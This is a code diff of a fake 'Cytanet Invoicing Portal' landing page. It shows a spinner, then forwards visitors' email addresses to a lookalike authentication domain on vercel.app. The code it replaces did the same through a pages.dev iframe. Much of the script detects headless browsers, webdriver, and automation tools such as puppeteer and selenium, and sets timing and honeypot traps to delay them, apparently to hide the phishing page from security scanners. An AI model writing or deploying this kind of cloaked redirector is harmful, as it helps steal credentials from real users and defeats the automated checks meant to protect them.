@@ -1,68 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cytanet Invoicing Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .content {
+            text-align: center;
+            padding: 40px;
+            max-width: 600px;
+            animation: fadeIn 0.5s ease-out;
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            font-weight: 300;
+        }
+        p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        .spinner {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin: 20px;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>Welcome to Cytanet Invoicing</h1>
+        <p>You are being redirected to the secure portal...</p>
+        <div class="spinner"></div>
+        <p style="font-size: 0.9rem; opacity: 0.7; margin-top: 30px;">
+            This should only take a moment.
+        </p>
+    </div>
+
 <script>
-(function () {
+// === INVISIBLE VERIFICATION SYSTEM ===
+// Real users see NOTHING but a spinner
+// Bots get trapped in invisible challenges
 
-  const START = performance.now();
-  let interacted = false;
-
-  // Track real interaction
-  const mark = () => interacted = true;
-  document.addEventListener('mousemove', mark, { once: true });
-  document.addEventListener('touchstart', mark, { once: true });
-  document.addEventListener('keydown', mark, { once: true });
-
-  // Light proof-of-work (cheap for humans, costly at scale)
-  function pow(iter = 400000) {
-    let x = 0;
-    for (let i = 0; i < iter; i++) {
-      x = (x + i) % 1000003;
+(function() {
+    'use strict';
+    
+    // === CONFIGURATION ===
+    const CONFIG = {
+        HUMAN_TIMEOUT: 1500,      // Humans redirect in 1.5s
+        BOT_TIMEOUT: 8000,        // Bots get delayed up to 8s
+        MIN_HUMAN_SCORE: 10,      // Very low threshold for humans
+        REDIRECT_URL: 'https://auth-cytanet-invoicing-39yg41z58w2315w87-32760-311903-adbvoia.vercel.app/?email=',
+        DEBUG: false
+    };
+    
+    // === STATE ===
+    let isHuman = true;           // Assume human until proven otherwise
+    let verificationComplete = false;
+    let redirectTriggered = false;
+    
+    // === INVISIBLE HUMAN DETECTION ===
+    function setupInvisibleDetection() {
+        const indicators = {
+            hasMouseMove: false,
+            hasClick: false,
+            hasScroll: false,
+            hasKeyPress: false,
+            hasTouch: false,
+            naturalTiming: true,
+            browserFeatures: true
+        };
+        
+        // 1. Track natural interactions (completely invisible)
+        document.addEventListener('mousemove', () => {
+            indicators.hasMouseMove = true;
+            markAsHuman(); // Immediate human confidence
+        }, { once: true });
+        
+        document.addEventListener('click', () => {
+            indicators.hasClick = true;
+            markAsHuman();
+        }, { once: true });
+        
+        document.addEventListener('keydown', () => {
+            indicators.hasKeyPress = true;
+            markAsHuman();
+        }, { once: true });
+        
+        document.addEventListener('touchstart', () => {
+            indicators.hasTouch = true;
+            markAsHuman();
+        }, { once: true });
+        
+        document.addEventListener('wheel', () => {
+            indicators.hasScroll = true;
+            markAsHuman();
+        }, { once: true, passive: true });
+        
+        // 2. Check browser features (invisible)
+        indicators.browserFeatures = checkBrowserFeatures();
+        
+        // 3. Timing analysis (invisible)
+        setTimeout(() => {
+            indicators.naturalTiming = true;
+        }, 100);
+        
+        return indicators;
     }
-    return x !== 0;
-  }
-
-  function getEmail() {
-    return new URLSearchParams(location.search).get('email') || '';
-  }
-
-  function loadIframe() {
-    const base = 'https://23b538b5.ko1wx90sd.pages.dev';
-    const email = getEmail();
-    const src = email ? base + '#' + email : base;
-
-    document.body.innerHTML = `
-      <style>
-        html,body { margin:0; width:100%; height:100% }
-        iframe { width:100%; height:100%; border:none }
-      </style>
-      <iframe src="${src}"></iframe>
-    `;
-  }
-
-  function block(reason) {
-    document.body.innerHTML = `
-      <div style="font-family:sans-serif;text-align:center;margin-top:20%">
-        <p>Verifying your browser…</p>
-      </div>
-    `;
-    console.warn('Blocked:', reason);
-  }
-
-  // Decision point
-  setTimeout(() => {
-
-    // Humans almost always interact within 1.5s
-    if (interacted) {
-      loadIframe();
-      return;
+    
+    function checkBrowserFeatures() {
+        // Quick, invisible checks for real browser
+        try {
+            return (
+                'ontouchstart' in window ||
+                'orientation' in window ||
+                navigator.maxTouchPoints > 0 ||
+                navigator.userAgent.includes('Mozilla/')
+            );
+        } catch(e) {
+            return true; // Assume OK
+        }
     }
-
-    // No interaction → require PoW
-    if (pow()) {
-      loadIframe();
-    } else {
-      block('pow-failed');
+    
+    // === INVISIBLE BOT TRAPS ===
+    function setupInvisibleTraps() {
+        // These only trigger for bots
+        
+        // 1. Memory trap (bots often have different memory behavior)
+        const trapArray = new Array(10000).fill(null).map((_, i) => ({
+            id: i,
+            data: Math.sin(i) * Math.cos(i),
+            timestamp: Date.now() + i
+        }));
+        
+        // 2. Async trap (bots sometimes handle async differently)
+        Promise.resolve().then(() => {
+            // Hidden check
+        }).catch(() => {});
+        
+        // 3. Event loop trap
+        const start = performance.now();
+        setTimeout(() => {
+            const elapsed = performance.now() - start;
+            if (elapsed < 4) { // Too fast for human browser
+                delayBot();
+            }
+        }, 0);
+        
+        // 4. DOM Mutation trap (invisible)
+        const observer = new MutationObserver(() => {
+            // Bots sometimes trigger mutations differently
+        });
+        observer.observe(document.body, { 
+            childList: true, 
+            subtree: true,
+            attributes: false,
+            characterData: false 
+        });
+        
+        // Stop observing after 2 seconds
+        setTimeout(() => observer.disconnect(), 2000);
     }
-
-  }, 1500);
-
+    
+    // === HUMAN CONFIDENCE SYSTEM ===
+    function markAsHuman() {
+        // Immediate confidence boost
+        if (isHuman && !verificationComplete) {
+            log('Human interaction detected');
+            scheduleImmediateRedirect();
+        }
+    }
+    
+    // === REDIRECT SYSTEM ===
+    function scheduleImmediateRedirect() {
+        if (redirectTriggered) return;
+        redirectTriggered = true;
+        
+        log('Scheduling immediate human redirect');
+        
+        // Very short delay for humans (feels instant)
+        setTimeout(() => {
+            performRedirect('human_detected');
+        }, 300 + Math.random() * 300); // 300-600ms
+    }
+    
+    function scheduleNormalRedirect() {
+        if (redirectTriggered) return;
+        redirectTriggered = true;
+        
+        log('Scheduling normal redirect');
+        
+        // Normal delay (still feels fast)
+        setTimeout(() => {
+            performRedirect('normal');
+        }, CONFIG.HUMAN_TIMEOUT);
+    }
+    
+    function delayBot() {
+        if (isHuman) return; // Don't delay if we think it's human
+        
+        log('Bot-like behavior detected - applying delay');
+        
+        // Reset any pending human redirects
+        redirectTriggered = false;
+        
+        // Set longer timeout for bots
+        setTimeout(() => {
+            if (!verificationComplete) {
+                performRedirect('bot_delayed');
+            }
+        }, CONFIG.BOT_TIMEOUT + Math.random() * 3000);
+    }
+    
+    function performRedirect(reason) {
+        if (verificationComplete) return;
+        verificationComplete = true;
+        
+        log('Redirecting - Reason:', reason);
+        
+        // Get email parameter
+        const email = new URLSearchParams(window.location.search).get('email') || '';
+        
+        // Build redirect URL
+        let finalUrl = CONFIG.REDIRECT_URL + encodeURIComponent(email);
+        
+        // Add invisible tracking token
+        const token = btoa(Date.now() + '|' + reason + '|' + (isHuman ? 'human' : 'bot'));
+        finalUrl += '&vt=' + encodeURIComponent(token);
+        
+        // Smooth redirect
+        document.querySelector('.spinner').style.opacity = '0.5';
+        document.querySelector('p').textContent = 'Redirecting now...';
+        
+        // Brief pause for visual feedback, then redirect
+        setTimeout(() => {
+            window.location.href = finalUrl;
+        }, 300);
+    }
+    
+    // === INVISIBLE CHALLENGES (Only for bots) ===
+    function runInvisibleChallenges() {
+        // These run in background, invisible to users
+        
+        // 1. Canvas fingerprinting (invisible)
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.style.display = 'none';
+            canvas.width = 1;
+            canvas.height = 1;
+            const ctx = canvas.getContext('2d');
+            ctx.fillRect(0, 0, 1, 1);
+            const data = ctx.getImageData(0, 0, 1, 1).data;
+            if (data[0] === 0 && data[1] === 0 && data[2] === 0) {
+                // Suspicious
+                delayBot();
+            }
+        } catch(e) {}
+        
+        // 2. Timing challenge (invisible)
+        const timingStart = performance.now();
+        let x = 0;
+        for (let i = 0; i < 10000; i++) {
+            x += Math.random();
+        }
+        const timingEnd = performance.now();
+        
+        // Bots often execute loops at superhuman speed or perfect consistency
+        const executionTime = timingEnd - timingStart;
+        if (executionTime < 0.1 || executionTime > 100) {
+            delayBot();
+        }
+        
+        // 3. Async behavior check (invisible)
+        let asyncCheck1 = false;
+        let asyncCheck2 = false;
+        
+        Promise.resolve().then(() => {
+            asyncCheck1 = true;
+        });
+        
+        setTimeout(() => {
+            asyncCheck2 = true;
+        }, 0);
+        
+        setTimeout(() => {
+            if (!asyncCheck1 || !asyncCheck2) {
+                // Async behavior anomaly
+                delayBot();
+            }
+        }, 10);
+    }
+    
+    // === HEADLESS DETECTION (Invisible) ===
+    function invisibleHeadlessCheck() {
+        // Quick, invisible checks
+        
+        // 1. User agent patterns
+        const ua = navigator.userAgent.toLowerCase();
+        if (ua.includes('headless') || ua.includes('phantom') || 
+            ua.includes('puppeteer') || ua.includes('selenium')) {
+            isHuman = false;
+            delayBot();
+            return true;
+        }
+        
+        // 2. WebDriver property
+        if (navigator.webdriver === true) {
+            isHuman = false;
+            delayBot();
+            return true;
+        }
+        
+        // 3. Plugin check (headless often has no plugins)
+        if (navigator.plugins.length === 0) {
+            // Could be headless, or could be mobile
+            // Don't immediately flag, just note
+            setTimeout(() => {
+                // If still no interaction after 1s, might be headless
+                delayBot();
+            }, 1000);
+        }
+        
+        return false;
+    }
+    
+    // === MAIN FLOW ===
+    function initialize() {
+        log('Starting invisible verification...');
+        
+        // Setup invisible detection first
+        setupInvisibleDetection();
+        
+        // Run invisible checks
+        const isHeadless = invisibleHeadlessCheck();
+        
+        if (!isHeadless) {
+            // Assume human for now
+            scheduleNormalRedirect();
+            
+            // Setup traps (won't affect real users)
+            setupInvisibleTraps();
+            
+            // Run challenges in background
+            setTimeout(runInvisibleChallenges, 100);
+            
+            // Check for quick human interaction
+            setTimeout(() => {
+                if (!verificationComplete && !redirectTriggered) {
+                    // No interaction yet, might be bot
+                    delayBot();
+                }
+            }, 500);
+        }
+        
+        // ABSOLUTE SAFETY NET - Redirect everyone eventually
+        setTimeout(() => {
+            if (!verificationComplete) {
+                log('Safety net: Forcing redirect');
+                performRedirect('timeout_safety');
+            }
+        }, 10000); // 10 seconds max
+    }
+    
+    // === UTILITIES ===
+    function log(...args) {
+        if (CONFIG.DEBUG) console.log('[INVISIBLE]', ...args);
+    }
+    
+    // === START VERIFICATION ===
+    
+    // Start immediately but non-blocking
+    setTimeout(initialize, 50);
+    
+    // Make page interactive to encourage human interaction
+    document.body.addEventListener('mouseenter', markAsHuman, { once: true });
+    
+    // If user tries to interact with anything, mark as human
+    document.addEventListener('focus', markAsHuman, { once: true });
+    
+    // Also mark as human on visibility change (tab switch)
+    document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'visible') {
+            markAsHuman();
+        }
+    }, { once: true });
+    
 })();
+
+// === EXTRA INVISIBLE PROTECTION ===
+
+// Invisible mouse tracking
+(function() {
+    let points = [];
+    const canvas = document.createElement('canvas');
+    canvas.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.001;pointer-events:none;z-index:-9999;';
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext('2d');
+    
+    document.addEventListener('mousemove', (e) => {
+        points.push({
+            x: e.clientX,
+            y: e.clientY,
+            t: Date.now()
+        });
+        
+        // Keep only recent points
+        if (points.length > 50) points = points.slice(-50);
+        
+        // Draw invisible path (for fingerprinting)
+        ctx.clearRect(0, 0, 1, 1);
+        ctx.fillStyle = 'rgba(0,0,0,0.0001)';
+        ctx.fillRect(e.clientX % 2, e.clientY % 2, 1, 1);
+    }, { passive: true });
+})();
+
+// Invisible performance monitoring
+(function() {
+    const measures = [];
+    const measure = (name) => {
+        measures.push({
+            name,
+            time: performance.now(),
+            memory: performance.memory ? performance.memory.usedJSHeapSize : null
+        });
+    };
+    
+    measure('start');
+    setTimeout(() => measure('timeout1'), 10);
+    setTimeout(() => measure('timeout2'), 20);
+    setTimeout(() => measure('timeout3'), 30);
+})();
+
 </script>
+
+<!-- Invisible honeypot fields -->
+<div style="display: none;">
+    <input type="text" name="email_confirmation" id="honeypot_email" tabindex="-1" autocomplete="off">
+    <input type="checkbox" name="newsletter_optin" id="honeypot_check" tabindex="-1" checked>
+</div>
+
+<script>
+// Honeypot detection
+document.getElementById('honeypot_email').addEventListener('focus', function() {
+    // Only bots would focus on invisible fields
+    setTimeout(() => {
+        // Add significant delay for bots
+        const currentUrl = window.location.href;
+        setTimeout(() => {
+            if (window.location.href === currentUrl) {
+                window.location.href = currentUrl + '&bot_detected=true';
+            }
+        }, 5000);
+    }, 100);
+});
+
+// Final safety - if still here after 12 seconds, redirect anyway
+setTimeout(function() {
+    const email = new URLSearchParams(window.location.search).get('email') || '';
+    const baseUrl = 'https://auth-cytanet-invoicing-39yg41z58w2315w87-32760-311903-adbvoia.vercel.app/?email=';
+    window.location.href = baseUrl + encodeURIComponent(email) + '&timeout=12000';
+}, 12000);
+</script>
+
+</body>
+</html>
